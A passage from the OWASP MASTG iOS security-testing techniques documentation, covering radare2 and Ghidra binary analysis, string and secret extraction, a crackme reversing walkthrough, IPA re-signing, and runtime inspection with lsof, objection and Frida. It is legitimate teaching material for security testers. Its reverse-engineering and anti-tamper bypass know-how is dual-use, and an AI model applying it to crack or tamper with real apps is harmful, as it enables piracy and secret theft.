DamnVulnerableIOSApp\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0070/#binary-information","title":"Binary Information","text":"<p>To get information about the binary, you can use the <code>i</code> command. This command will list information about the binary, such as the architecture, the list of shared libraries, the list of classes and methods, strings and more.</p> <pre><code>[0x1000180c8]&gt; i\n...\nsize     0x43d5f0\nhumansz  4.2M\nmode     r-x\nformat   mach064\niorw     false\nblock    0x100\npacket   xtr.fatmach0\n...\nlang     objc with blocks\nlinenum  false\nlsyms    false\nnx       false\nos       ios\npic      true\nrelocs   true\nsanitize false\nstatic   false\nstripped true\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0070/#classes-and-methods","title":"Classes and Methods","text":"<p>And then we can proceed to extract information about the methods in the application's source code. To do this, we need to load the application binary into radare and then list the classes and methods in the binary.</p> <pre><code>[0x1000180c8]&gt; icc\n\n...\n\n@interface SFAntiPiracy : NSObject\n{\n}\n+ (int) isPirated\n+ (int) isJailbroken\n+ (void) killApplication\n+ (bool) isTheDeviceJailbroken\n+ (bool) isTheApplicationCracked\n+ (bool) isTheApplicationTamperedWith\n+ (int) urlCheck\n...\n@end\n</code></pre> <p>Note the plus sign, which means that this is a class method that returns a BOOL type. A minus sign would mean that this is an instance method. Refer to later sections to understand the practical difference between these.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0070/#linked-libraries","title":"Linked Libraries","text":"<p>The following command is listing shared libraries:</p> <pre><code>[0x1000180c8]&gt; il\n[Linked libraries]\n/System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration\n/System/Library/Frameworks/StoreKit.framework/StoreKit\n/System/Library/Frameworks/Security.framework/Security\n/System/Library/Frameworks/QuartzCore.framework/QuartzCore\n/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices\n/usr/lib/libz.1.dylib\n/System/Library/Frameworks/CoreLocation.framework/CoreLocation\n/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics\n/System/Library/Frameworks/CFNetwork.framework/CFNetwork\n/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox\n/System/Library/Frameworks/CoreData.framework/CoreData\n/System/Library/Frameworks/UIKit.framework/UIKit\n/System/Library/Frameworks/Foundation.framework/Foundation\n/usr/lib/libobjc.A.dylib\n/usr/lib/libSystem.B.dylib\n/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\n\n16 libraries\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0070/#strings","title":"Strings","text":"<p>Obtaining strings is very useful when reverse engineering an app because it can give you a lot of information about the app's functionality. For example, you can find URLs, API endpoints, encryption keys, and more. You can also find strings that will point you to interesting functions, such as the login function or a function that checks whether the device is jailbroken.</p> <pre><code>[0x1000180c8]&gt; izz~cstring | less\n\n\n29903 0x001d0b4c 0x1001d0b4c 5   6    5.__TEXT.__cstring        ascii   Admin\n29904 0x001d0b52 0x1001d0b52 13  14   5.__TEXT.__cstring        ascii   This!sA5Ecret\n29905 0x001d0b60 0x1001d0b60 15  16   5.__TEXT.__cstring        ascii   pushSuccessPage\n29906 0x001d0b70 0x1001d0b70 4   5    5.__TEXT.__cstring        ascii   Oops\n29907 0x001d0b75 0x1001d0b75 30  31   5.__TEXT.__cstring        ascii   Incorrect Username or Password\n29908 0x001d0b94 0x1001d0b94 17  18   5.__TEXT.__cstring        ascii   usernameTextField\n29909 0x001d0ba6 0x1001d0ba6 39  40   5.__TEXT.__cstring        ascii   T@\"UITextField\",&amp;,N,V_usernameTextField\n29910 0x001d0bce 0x1001d0bce 17  18   5.__TEXT.__cstring        ascii   passwordTextField\n...\n29915 0x001d0ca8 0x1001d0ca8 18  19   5.__TEXT.__cstring        ascii   http://google.com/\n29926 0x001d0d73 0x1001d0d73 37  38   5.__TEXT.__cstring        ascii   Request Sent using pinning, lookout !\n29927 0x001d0d99 0x1001d0d99 77  78   5.__TEXT.__cstring        ascii   Certificate validation failed. \n                                                                        You will have to do better than this, my boy!!\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0071/","title":"MASTG-TECH-0071: Retrieving Strings","text":"<p>Strings are always a good starting point while analyzing a binary, as they provide context to the associated code. For instance, an error log string such as \"Cryptogram generation failed\" gives us a hint that the adjoining code might be responsible for the generation of a cryptogram.</p> <p>In order to extract strings from an iOS binary, you can use GUI tools such as Ghidra or iaito or rely on CLI-based tools such as the strings Unix utility (<code>strings &lt;path_to_binary&gt;</code>) or radare2's  rabin2 (<code>rabin2 -zz &lt;path_to_binary&gt;</code>). When using the CLI-based ones you can take advantage of other tools such as grep (e.g. in conjunction with regular expressions) to further filter and analyze the results.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0072/","title":"MASTG-TECH-0072: Retrieving Cross References","text":"<p>Ghidra can be used for analyzing the iOS binaries and obtaining cross references by right clicking the desired function and selecting Show References to.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0073/","title":"MASTG-TECH-0073: Information Gathering - API Usage","text":"<p>The iOS platform provides many built-in libraries for frequently used functionalities in applications, for example cryptography, Bluetooth, NFC, network and location libraries. Determining the presence of these libraries in an application can give us valuable information about its underlying working.</p> <p>For instance, if an application is importing the <code>CC_SHA256</code> function, it indicates that the application will be performing some kind of hashing operation using the SHA256 algorithm. Further information on how to analyze iOS's cryptographic APIs is discussed in the section \"iOS Cryptographic APIs\".</p> <p>Similarly, the above approach can be used to determine where and how an application is using Bluetooth. For instance, an application performing communication using the Bluetooth channel must use functions from the Core Bluetooth framework such as <code>CBCentralManager</code> or <code>connect</code>. Using the iOS Bluetooth documentation you can determine the critical functions and start analysis around those function imports.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0074/","title":"MASTG-TECH-0074: Information Gathering - Network Communication","text":"<p>Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis (e.g. traffic capture and analysis), you can obtain some initial inputs or entry points by enumerating the domains to which the application is supposed to communicate to.</p> <p>Typically these domains will be present as strings within the binary of the application. One can extract domains by retrieving strings (as discussed above) or checking the strings using tools like Ghidra. The latter option has a clear advantage: it can provide you with context, as you'll be able to see in which context each domain is being used by checking the cross-references.</p> <p>From here on you can use this information to derive more insights which might be of use later during your analysis, e.g. you could match the domains to the pinned certificates or perform further reconnaissance on domain names to know more about the target environment.</p> <p>The implementation and verification of secure connections can be an intricate process and there are numerous aspects to consider. For instance, many applications use other protocols apart from HTTP such as XMPP or plain TCP packets, or perform certificate pinning in an attempt to deter MITM attacks.</p> <p>Remember that in most cases, using only static analysis will not be enough and might even turn out to be extremely inefficient when compared to the dynamic alternatives which will get much more reliable results (e.g. using an interception proxy). In this section we've only touched the surface, so please refer to  Basic Network Monitoring/Sniffing in the \"iOS Basic Security Testing\" chapter and check out the test cases in the chapter \"iOS Network Communication\" for further information.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0075/","title":"MASTG-TECH-0075: Reviewing Decompiled Objective-C and Swift Code","text":"<p>TBD</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0076/","title":"MASTG-TECH-0076: Reviewing Disassembled Objective-C and Swift Code","text":"<p>In this section we will be exploring iOS application's binary code manually and perform static analysis on it. Manual analysis can be a slow process and requires immense patience. A good manual analysis can make the dynamic analysis more successful.</p> <p>There are no hard written rules for performing static analysis, but there are few rules of thumb which can be used to have a systematic approach to manual analysis:</p> <ul> <li>Understand the working of the application under evaluation - the objective of the application and how it behaves in case of wrong input.</li> <li>Explore the various strings present in the application binary, this can be very helpful, for example in spotting interesting functionalities and possible error handling logic in the application.</li> <li>Look for functions and classes having names relevant to our objective.</li> <li>Lastly, find the various entry points into the application and follow along from there to explore the application.</li> </ul> <p>Techniques discussed in this section are generic and applicable irrespective of the tools used for analysis.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0076/#objective-c","title":"Objective-C","text":"<p>To effectively review disassembled native code, it's important to have a basic understanding of the Objective-C runtime. Functions like <code>_objc_msgSend</code> and <code>_objc_release</code> are particularly significant within the Objective-C runtime.</p> <p>In addition to what you've learned in  Disassembling Native Code, we will apply these concepts using  iOS UnCrackable L1. The objective of this app is to find a secret string hidden within its binary.</p> <p>The application features a simple home screen, allowing user interaction by inputting custom strings into the provided text field. Our goal is to reverse engineer the app to uncover the hidden secret string.</p> <p></p> <p>When the user inputs the wrong string, the application shows a pop-up with the \"Verification Failed\" message.</p> <p></p> <p>You can keep note of the strings displayed in the pop-up, as this might be helpful when searching for the code where the input is processed and a decision is being made. Luckily, the complexity and interaction with this application is straightforward, which bodes well for our reversing endeavors.</p> <p>For static analysis in this section, we will be using Ghidra 9.0.4. Ghidra 9.1_beta auto-analysis has a bug and does not show the Objective-C classes.</p> <p>We can start by checking the strings present in the binary by opening it in Ghidra. The listed strings might be overwhelming at first, but with some experience in reversing Objective-C code, you'll learn how to filter and discard the strings that are not really helpful or relevant. For instance, the ones shown in screenshot below, which are generated for the Objective-C runtime. Other strings might be helpful in some cases, such as those containing symbols (function names, class names, etc.) and we'll be using them when performing static analysis to check if some specific function is being used.</p> <p></p> <p>If we continue our careful analysis, we can spot the string, \"Verification Failed\", which is used for the pop-up when a wrong input is given. If you follow the cross-references (Xrefs) of this string, you will reach <code>buttonClick</code> function of the <code>ViewController</code> class. We will look into the <code>buttonClick</code> function later in this section. When further checking the other strings in the application, only a few of them look a likely candidate for a hidden flag. You can try them and verify as well.</p> <p></p> <p>Moving forward, we have two paths to take. Either we can start analyzing the <code>buttonClick</code> function identified in the above step, or start analyzing the application from the various entry points. In real world situation, most times you will be taking the first path, but from a learning perspective, in this section we will take the latter path.</p> <p>An iOS application calls different predefined functions provided by the iOS runtime depending on its the state within the application life cycle. These functions are known as the entry points of the app. For example:</p> <ul> <li><code>[AppDelegate application:didFinishLaunchingWithOptions:]</code> is called when the application is started for the first time.</li> <li><code>[AppDelegate applicationDidBecomeActive:]</code> is called when the application is moving from inactive to active state.</li> </ul> <p>Many applications execute critical code in these sections and therefore they're normally a good starting point in order to follow the code systematically.</p> <p>Once we're done with the analysis of all the functions in the <code>AppDelegate</code> class, we can conclude that there is no relevant code present. The lack of any code in the above functions raises the question - from where is the application's initialization code being called?</p> <p>Luckily the current application has a small code base, and we can find another <code>ViewController</code> class in the Symbol Tree view. In this class, function <code>viewDidLoad</code> function looks interesting. If you check the documentation of <code>viewDidLoad</code>, you can see that it can also be used to perform additional initialization on views.</p> <p></p> <p>If we check the decompilation of this function, there are a few interesting things going on. For instance, there is a call to a native function at line 31 and a label is initialized with a <code>setHidden</code> flag set to 1 in lines 27-29. You can keep a note of these observations and continue exploring the other functions in this class. For brevity, exploring the other parts of the function is left as an exercise for the readers.</p> <p>In our first step, we observed that the application verifies the input string only when the UI button is pressed. Thus, analyzing the <code>buttonClick</code> function is an obvious target. As earlier mentioned, this function also contains the string we see in the pop-ups. At line 29 a decision is being made, which is based on the result of <code>isEqualString</code> (output saved in <code>uVar1</code> at line 23). The input for the comparison is coming from the text input field (from the user) and the value of the <code>label</code>. Therefore, we can assume that the hidden flag is stored in that label.</p> <p></p> <p>Now we have followed the complete flow and have all the information about the application flow. We also concluded that the hidden flag is present in a text label and in order to determine the value of the label, we need to revisit <code>viewDidLoad</code> function, and understand what is happening in the native function identified. Analysis of the native function is discussed in  Reviewing Disassembled Native Code.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0077/","title":"MASTG-TECH-0077: Reviewing Disassembled Native Code","text":"<p>Analyzing disassembled native code requires a good understanding of the calling conventions and instructions used by the underlying platform. In this section we are looking in ARM64 disassembly of the native code. A good starting point to learn about ARM architecture is available at Introduction to ARM Assembly Basics by Azeria Labs Tutorials. This is a quick summary of the things that we will be using in this section:</p> <ul> <li>In ARM64, a register is of 64 bit in size and referred to as Xn, where n is a number from 0 to 31. If the lower (LSB) 32 bits of the register are used then it's referred to as Wn.</li> <li>The input parameters to a function are passed in the X0-X7 registers.</li> <li>The return value of the function is passed via the X0 register.</li> <li>Load (LDR) and store (STR) instructions are used to read or write to memory from/to a register.</li> <li>B, BL, BLX are branch instructions used for calling a function.</li> </ul> <p>As mentioned above as well, Objective-C code is also compiled to native binary code, but analyzing C/C++ native can be more challenging. In case of Objective-C there are various symbols (especially function names) present, which eases the understanding of the code. In the above section we've learned that the presence of function names like <code>setText</code>, <code>isEqualStrings</code> can help us in quickly understanding the semantics of the code. In case of C/C++ native code, if all the binaries are stripped, there can be very few or no symbols present to assist us into analyzing it.</p> <p>Decompilers can help us in analyzing native code, but they should be used with caution. Modern decompilers are very sophisticated and among many techniques used by them to decompile code, a few of them are heuristics based. Heuristics based techniques might not always give correct results, one such case being, determining the number of input parameters for a given native function. Having knowledge of analyzing disassembled code, assisted with decompilers can make analyzing native code less error prone.</p> <p>We will be analyzing the native function identified in <code>viewDidLoad</code> function in the previous section. The function is located at offset 0x1000080d4. The return value of this function used in the <code>setText</code> function call for the label. This text is used to compare against the user input. Thus, we can be sure that this function will be returning a string or equivalent.</p> <p></p> <p>The first thing we can see in the disassembly of the function is that there is no input to the function. The registers X0-X7 are not read throughout the function. Also, there are multiple calls to other functions like the ones at 0x100008158, 0x10000dbf0 etc.</p> <p>The instructions corresponding to one such function calls can be seen below. The branch instruction <code>bl</code> is used to call the function at 0x100008158.</p> <pre><code>1000080f0 1a 00 00 94     bl         FUN_100008158\n1000080f4 60 02 00 39     strb       w0,[x19]=&gt;DAT_10000dbf0\n</code></pre> <p>The return value from the function (found in W0), is stored to the address in register X19 (<code>strb</code> stores a byte to the address in register). We can see the same pattern for other function calls, the returned value is stored in X19 register and each time the offset is one more than the previous function call. This behavior can be associated with populating each index of a string array at a time. Each return value is been written to an index of this string array. There are 11 such calls, and from the current evidence we can make an intelligent guess that length of the hidden flag is 11. Towards the end of the disassembly, the function returns with the address to this string array.</p> <pre><code>100008148 e0 03 13 aa     mov        x0=&gt;DAT_10000dbf0,x19\n</code></pre> <p>To determine the value of the hidden flag we need to know the return value of each of the subsequent function calls identified above. When analyzing the function 0x100006fb4, we can observe that this function is much bigger and more complex than the previous one we analyzed. Function graphs can be very helpful when analyzing complex functions, as it helps into better understanding the control flow of the function. Function graphs can be obtained in Ghidra by clicking the Display function graph icon in the sub-menu.</p> <p></p> <p>Manually analyzing all the native functions completely will be time consuming and might not be the wisest approach. In such a scenario using a dynamic analysis approach is highly recommended (see  Dynamic Analysis on iOS). For instance, by using the techniques like hooking or simply debugging the application, we can easily determine the returned values. Normally it's a good idea to use a dynamic analysis approach and then fallback to manually analyzing the functions in a feedback loop. This way you can benefit from both approaches at the same time while saving time and reducing effort.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0078/","title":"MASTG-TECH-0078: Automated Static Analysis","text":"<p>Several automated tools for analyzing iOS apps are available; most of them are commercial tools. The free and open source tools  MobSF and  objection have some static and dynamic analysis functionality. Additional tools are on the \"Testing Tools\" page.</p> <p>Don't shy away from using automated scanners for your analysis - they help you pick low-hanging fruit and allow you to focus on the more interesting aspects of analysis, such as the business logic. Keep in mind that static analyzers may produce false positives and false negatives; always review the findings carefully.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0079/","title":"MASTG-TECH-0079: Obtaining a Developer Provisioning Profile","text":"<p>The provisioning profile is a plist file signed by Apple, which adds your code-signing certificate to its list of accepted certificates on one or more devices. In other words, this represents Apple explicitly allowing your app to run for certain reasons, such as debugging on selected devices (development profile). The provisioning profile also includes the entitlements granted to your app. The certificate contains the private key you'll use to sign.</p> <p>A valid provisioning profile can only be obtained from Apple. This means that you need a valid Apple account.</p> <p>Info</p> <p>You can obtain a valid provisioning profile for both normal Apple accounts, and for Apple Developer accounts. There are two important differences between the two types:</p> <p>Certificate expiration</p> <ul> <li>Apple account: Certificates expire 7 days after creation</li> <li>Developer account: Certificates expire 1 year after creation</li> </ul> <p>Wildcard certificates</p> <ul> <li>Apple account: Certificates are only valid for one Bundle Identifier. This Bundle Identifier has to be unique.</li> <li>Developer account: Certificates can be wildcards, allowing you to keep the original Bundle Identifier</li> </ul> <p>An Apple Developer account costs $99 per year and is a nice-to-have due to the longer expiration, but not a requirement.</p> <p>The steps below work for both a normal Apple account and an Apple Developer account, but do require a macOS host.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0079/#creating-a-signing-identity","title":"Creating a signing identity","text":"<p>Install  Xcode and create a new iOS application with any language and configuration. Set up the project to use automatic signing and deploy the application to your iOS device. During this flow, you will have to accept your Developer certificate on the device, as well as enable Developer mode.</p> <p>After these steps, you can use the  security command to list your signing identities:</p> <pre><code>$ security find-identity -v -p codesigning\n 1) 50034388646913B117AF1D6E51D9E045B77EA916 \"Apple Development: MAS@owasp.org (LVGBSLUQB4)\"\n     1 valid identities found\n</code></pre> <p>Additionally, the provisioning profile is stored on your host in the <code>~/Library/Developer/Xcode/DerivedData</code> folder:</p> <pre><code>$ find  ~/Library/Developer/Xcode/DerivedData | grep embedded\n/Users/MAS/Library/Developer/Xcode/DerivedData/apptest-aijwmhfiximgzkhcmnluxrscflyc/Build/Products/Debug-iphoneos/apptest.app/embedded.mobileprovision\n</code></pre> <p>This file can be copied to your local directory and can be used to sign any IPA file, even those with a different identifier.</p> <pre><code>cp /Users/MAS/Library/Developer/Xcode/DerivedData/apptest-aijwmhfiximgzkhcmnluxrscflyc/Build/Products/Debug-iphoneos/apptest.app/embedded.mobileprovision ./embedded.mobileprovision\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0079/#inspecting-the-provisioning-profile","title":"Inspecting the Provisioning Profile","text":"<p>Once you've obtained the provisioning profile, you can inspect its contents with the  security command. You'll find the entitlements granted to the app in the profile, along with the allowed certificates and devices.</p> <pre><code>$ security cms -D -i embedded.mobileprovision\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n    &lt;dict&gt;\n        &lt;key&gt;AppIDName&lt;/key&gt;\n        &lt;string&gt;XC org mas testapp&lt;/string&gt;\n        &lt;key&gt;ApplicationIdentifierPrefix&lt;/key&gt;\n        &lt;array&gt;\n            &lt;string&gt;QH868V5764&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;CreationDate&lt;/key&gt;\n        &lt;date&gt;2024-12-26T07:22:22Z&lt;/date&gt;\n        &lt;key&gt;Platform&lt;/key&gt;\n        &lt;array&gt;\n            &lt;string&gt;iOS&lt;/string&gt;\n            &lt;string&gt;xrOS&lt;/string&gt;\n            &lt;string&gt;visionOS&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;IsXcodeManaged&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;DeveloperCertificates&lt;/key&gt;\n        &lt;array&gt;\n            &lt;data&gt;...SNIP...&lt;/data&gt;\n        &lt;/array&gt;\n        &lt;key&gt;DER-Encoded-Profile&lt;/key&gt;\n        &lt;data&gt;...SNIP...&lt;/data&gt;\n        &lt;key&gt;Entitlements&lt;/key&gt;\n        &lt;dict&gt;\n            &lt;key&gt;application-identifier&lt;/key&gt;\n            &lt;string&gt;QH868V5764.org.mas.apptest&lt;/string&gt;\n            &lt;key&gt;keychain-access-groups&lt;/key&gt;\n            &lt;array&gt;\n                &lt;string&gt;QH868V5764.*&lt;/string&gt;\n            &lt;/array&gt;\n            &lt;key&gt;get-task-allow&lt;/key&gt;\n            &lt;true/&gt;\n            &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;\n            &lt;string&gt;QH868V5764&lt;/string&gt;\n        &lt;/dict&gt;\n        &lt;key&gt;ExpirationDate&lt;/key&gt;\n        &lt;date&gt;2025-01-02T07:22:22Z&lt;/date&gt;\n        &lt;key&gt;Name&lt;/key&gt;\n        &lt;string&gt;iOS Team Provisioning Profile: org.mas.testapp&lt;/string&gt;\n        &lt;key&gt;ProvisionedDevices&lt;/key&gt;\n        &lt;array&gt;\n            &lt;string&gt;...SNIP...&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;LocalProvision&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;TeamIdentifier&lt;/key&gt;\n        &lt;array&gt;\n            &lt;string&gt;QH868V5764&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;TeamName&lt;/key&gt;\n        &lt;string&gt;OWASP MAS&lt;/string&gt;\n        &lt;key&gt;TimeToLive&lt;/key&gt;\n        &lt;integer&gt;7&lt;/integer&gt;\n        &lt;key&gt;UUID&lt;/key&gt;\n        &lt;string&gt;...SNIP...&lt;/string&gt;\n        &lt;key&gt;Version&lt;/key&gt;\n        &lt;integer&gt;1&lt;/integer&gt;\n    &lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0080/","title":"MASTG-TECH-0080: Get Open Files","text":"<p><code>lsof</code> is a powerful command, and provides a plethora of information about a running process. It can provide a list of all open files, including a stream, a network file or a regular file. When invoking the <code>lsof</code> command without any option it will list all open files belonging to all active processes on the system, while when invoking with the flags <code>-c &lt;process name&gt;</code> or <code>-p &lt;pid&gt;</code>, it returns the list of open files for the specified process. The man page shows various other options in detail.</p> <p>Using <code>lsof</code> for an iOS application running with PID 2828, list various open files as shown below.</p> <pre><code>iPhone:~ root# lsof -p 2828\nCOMMAND  PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME\niOweApp 2828 mobile  cwd    DIR    1,2      864      2 /\niOweApp 2828 mobile  txt    REG    1,3   206144 189774 /private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp\niOweApp 2828 mobile  txt    REG    1,3     5492 213230 /private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2B-972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C5224537F7F23DF19314CF6FD8AA.closure\niOweApp 2828 mobile  txt    REG    1,3    30628 212198 /private/var/preferences/Logging/.plist-cache.vqXhr1EE\niOweApp 2828 mobile  txt    REG    1,2    50080 234433 /usr/lib/libobjc-trampolines.dylib\niOweApp 2828 mobile  txt    REG    1,2   344204  74185 /System/Library/Fonts/AppFonts/ChalkboardSE.ttc\niOweApp 2828 mobile  txt    REG    1,2   664848 234595 /usr/lib/dyld\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0081/","title":"MASTG-TECH-0081: Get Open Connections","text":"<p><code>lsof</code> command when invoked with option <code>-i</code>, it gives the list of open network ports for all active processes on the device. To get a list of open network ports for a specific process, the <code>lsof -i -a -p &lt;pid&gt;</code> command can be used, where <code>-a</code> (AND) option is used for filtering. Below a filtered output for PID 1 is shown.</p> <pre><code>iPhone:~ root# lsof -i -a -p 1\nCOMMAND PID USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME\nlaunchd   1 root   27u  IPv6 0x69c2ce210efdc023      0t0  TCP *:ssh (LISTEN)\nlaunchd   1 root   28u  IPv6 0x69c2ce210efdc023      0t0  TCP *:ssh (LISTEN)\nlaunchd   1 root   29u  IPv4 0x69c2ce210eeaef53      0t0  TCP *:ssh (LISTEN)\nlaunchd   1 root   30u  IPv4 0x69c2ce210eeaef53      0t0  TCP *:ssh (LISTEN)\nlaunchd   1 root   31u  IPv4 0x69c2ce211253b90b      0t0  TCP 192.168.1.12:ssh-&gt;192.168.1.8:62684 (ESTABLISHED)\nlaunchd   1 root   42u  IPv4 0x69c2ce211253b90b      0t0  TCP 192.168.1.12:ssh-&gt;192.168.1.8:62684 (ESTABLISHED)\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0082/","title":"MASTG-TECH-0082: Get Shared Libraries","text":"<p>To effectively identify and analyze shared libraries within an iOS application, it's important to distinguish between the app's bundled libraries and the system libraries provided by iOS. This distinction helps focus on the components that are unique to the app, thereby reducing noise during security assessments.</p> <ul> <li>System Libraries: Part of the iOS SDK, located in directories such as <code>/System/Library/Frameworks</code> or <code>/usr/lib</code>. These libraries are standard for all iOS applications and generally don't require detailed analysis unless there is a specific reason.</li> <li>App-Bundled Libraries: Included in the app bundle, often found in the <code>Frameworks</code> directory (<code>YourApp.app/Frameworks</code>). They include both first-party (custom) and third-party libraries that the developer intentionally incorporated into the app. They are the primary focus for security assessments. However, note that some system libraries may be also bundled with the app to ensure compatibility with specific versions of the iOS SDK so you'd need to filter them out.</li> </ul> <p>Note that we're not considering static libraries, which, unlike dynamic libraries that are loaded at runtime, become part of the app's binary, resulting in a single executable file.</p> <p>Strategy: Use one of the methods below, or a combination of them, to identify shared libraries, and then filter out system libraries to focus on those that are bundled with the app.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0082/#inspecting-the-application-binary","title":"Inspecting the Application Binary","text":"<p>Navigate to the <code>Frameworks</code> directory within the application bundle to find the shared libraries. The shared libraries are usually in the form of <code>.framework</code> or <code>.dylib</code> files.</p> <pre><code>ls -1 Frameworks\nApp.framework\nFlutter.framework\nlibswiftCore.dylib\nlibswiftCoreAudio.dylib\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0082/#otool","title":"otool","text":"<p>You can use the <code>otool -L</code> command to list the shared libraries.</p> <pre><code>otool -L MASTestApp\nMASTestApp:\n        /System/Library/Frameworks/Foundation.framework/Foundation (compatibility version 300.0.0, current version 2503.1.0)\n        /usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version 228.0.0)\n        /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1345.120.2)\n        /System/Library/Frameworks/CryptoKit.framework/CryptoKit (compatibility version 1.0.0, current version 1.0.0)\n        ...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0082/#radare2-for-ios","title":"radare2 for iOS","text":"<p>In radare2, you can list the linked libraries using the <code>il</code> command.</p> <pre><code>r2 MASTestApp\n[0x100006e9c]&gt; il\n[Linked libraries]\n/System/Library/Frameworks/Foundation.framework/Foundation\n/usr/lib/libobjc.A.dylib\n/usr/lib/libSystem.B.dylib\n/System/Library/Frameworks/CryptoKit.framework/CryptoKit\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0082/#objection-for-ios","title":"objection for iOS","text":"<p>You can use Objection's command <code>list_frameworks</code> to list all the app's bundles that represent Frameworks.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios bundles list_frameworks\nExecutable      Bundle                                     Version    Path\n--------------  -----------------------------------------  ---------  -------------------------------------------\nBolts           org.cocoapods.Bolts                        1.9.0      ...8/DVIA-v2.app/Frameworks/Bolts.framework\nRealmSwift      org.cocoapods.RealmSwift                   4.1.1      ...A-v2.app/Frameworks/RealmSwift.framework\n                                                                      ...ystem/Library/Frameworks/IOKit.framework\n...\n</code></pre> <p>The <code>list_bundles</code> command lists all of the application's bundles that are not related to frameworks. The output contains the executable name, bundle id, version of the library and path to the library.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios bundles list_bundles\nExecutable    Bundle                                       Version  Path\n------------  -----------------------------------------  ---------  -------------------------------------------\nDVIA-v2       com.highaltitudehacks.DVIAswiftv2.develop          2  ...-1F0C-4DB1-8C39-04ACBFFEE7C8/DVIA-v2.app\nCoreGlyphs    com.apple.CoreGlyphs                               1  ...m/Library/CoreServices/CoreGlyphs.bundle\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0082/#frida-for-ios","title":"Frida for iOS","text":"<p>The <code>Process.enumerateModules()</code> function in Frida's REPL allows enumeration of modules loaded into memory during runtime.</p> <pre><code>[iPhone::com.iOweApp]-&gt; Process.enumerateModules()\n[\n    {\n        \"base\": \"0x10008c000\",\n        \"name\": \"iOweApp\",\n        \"path\": \"/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp\",\n        \"size\": 49152\n    },\n    {\n        \"base\": \"0x1a1c82000\",\n        \"name\": \"Foundation\",\n        \"path\": \"/System/Library/Frameworks/Foundation.framework/Foundation\",\n        \"size\": 2859008\n    },\n    {\n        \"base\": \"0x1a16f4000\",\n        \"name\": \"libobjc.A.dylib\",\n        \"path\": \"/usr/lib/libobjc.A.dylib\",\n        \"size\": 200704\n    },\n\n    ...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0083/","title":"MASTG-TECH-0083: Sandbox Inspection","text":"<p>On iOS, each application gets a sandboxed folder to store its data. As per the iOS security model, an application's sandboxed folder cannot be accessed by another application. Additionally, the users do not have direct access to the iOS filesystem, thus preventing browsing or extraction of data from the filesystem. In iOS &lt; 8.3 there were applications available which can be used to browse the device's filesystem, such as iExplorer and iFunBox, but in the recent version of iOS (&gt;8.3) the sandboxing rules are more stringent and these applications do not work anymore. As a result, if you need to access the filesystem it can only be accessed on a jailbroken device. As part of the jailbreaking process, the application sandbox protection is disabled and thus enabling an easy access to sandboxed folders.</p> <p>Refer to  Accessing App Data Directories to learn about the contents of an application's sandboxed folder and get an overview of the folder structure and which directories you should 